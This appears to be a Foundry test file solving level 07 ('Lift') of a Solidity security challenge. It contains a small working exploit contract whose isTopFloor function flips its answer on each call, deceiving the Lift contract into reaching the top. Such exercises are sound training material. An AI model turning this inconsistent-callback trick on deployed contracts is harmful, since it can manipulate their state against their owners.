// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "../src/07_Lift/Lift.sol";

// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;
    bool isTop = true;

    function setUp() public override {
        super.setUp();

        instance = new Lift();
    }

    function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */
        LiftNaeb lift = new LiftNaeb();
        lift.toTheMoon(instance, 2);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}
contract LiftNaeb is House {
    bool flag = true;

    function isTopFloor(uint256 floor) external override returns(bool) {
        flag = !flag;

        return flag;
    }

    function toTheMoon(Lift instance, uint256 floor) external {
        instance.goToFloor(floor);
    }
}